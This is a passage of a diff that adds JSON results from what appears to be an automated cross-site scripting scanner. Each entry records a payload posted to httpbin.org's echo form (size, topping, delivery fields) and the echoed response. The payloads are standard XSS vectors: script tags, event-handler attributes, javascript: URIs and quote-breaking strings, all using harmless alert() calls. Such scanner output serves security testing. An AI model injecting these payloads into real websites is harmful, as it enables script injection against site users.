+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<keygen onfocus=alert('XSS') autofocus>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<video><source onerror=alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"126\", \n    \"Content-Type\": \"application/x-www-f",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<audio src=x onerror=alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"122\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<details open ontoggle=alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"122\", \n    \"Content-Type\": \"application/x-www-f",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"';alert('XSS');//\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"107\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n ",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"\\\";alert('XSS');//\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"107\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"</script><script>alert('XSS')</script>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"134\", \n    \"Content-Type\": \"application/x-www",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<script>alert(String.fromCharCode(88,83,83))</script>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"147\", \n    \"Content-Type\": \"ap",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<script>alert(/XSS/)</script>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"119\", \n    \"Content-Type\": \"application/x-www-form-url",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<script>alert`XSS`</script>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"113\", \n    \"Content-Type\": \"application/x-www-form-urlen",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<script>alert(1)</script>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"111\", \n    \"Content-Type\": \"application/x-www-form-urlenco",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "<html>\r\n<head><title>502 Bad Gateway</title></head>\r\n<body>\r\n<center><h1>502 Bad Gateway</h1></center>\r\n</body>\r\n</html>\r\n",
+      "status_code": 502
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<img src=x onerror=alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"117\", \n    \"Content-Type\": \"application/x-www-form-url",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<svg onload=alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"108\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"javascript:alert('XSS')\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"102\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\",",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<iframe src=javascript:alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"121\", \n    \"Content-Type\": \"application/x-www-form",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<body onload=alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"109\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<input onfocus=alert('XSS') autofocus>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"121\", \n    \"Content-Type\": \"application/x-www-fo",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<select onfocus=alert('XSS') autofocus>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"122\", \n    \"Content-Type\": \"application/x-www-f",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<textarea onfocus=alert('XSS') autofocus>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<keygen onfocus=alert('XSS') autofocus>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"122\", \n    \"Content-Type\": \"application/x-www-f",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<video><source onerror=alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"123\", \n    \"Content-Type\": \"application/x-www-form",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<audio src=x onerror=alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"119\", \n    \"Content-Type\": \"application/x-www-form-u",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<details open ontoggle=alert('XSS')>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"119\", \n    \"Content-Type\": \"application/x-www-form",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"';alert('XSS');//\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"104\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    ",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"\\\";alert('XSS');//\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"104\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n   ",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"</script><script>alert('XSS')</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"131\", \n    \"Content-Type\": \"application/x-www-fo",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<script>alert(String.fromCharCode(88,83,83))</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"144\", \n    \"Content-Type\": \"appli",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<script>alert(/XSS/)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-urlenc",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<script>alert`XSS`</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"110\", \n    \"Content-Type\": \"application/x-www-form-urlencod",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "topping",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"<script>alert(1)</script>\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"108\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<script>alert('XSS')</script>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<img src=x onerror=alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-www-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<svg onload=alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"javascript:alert('XSS')\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"110\", \n    \"Content-Type\": \"application/x-www-form-urle",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
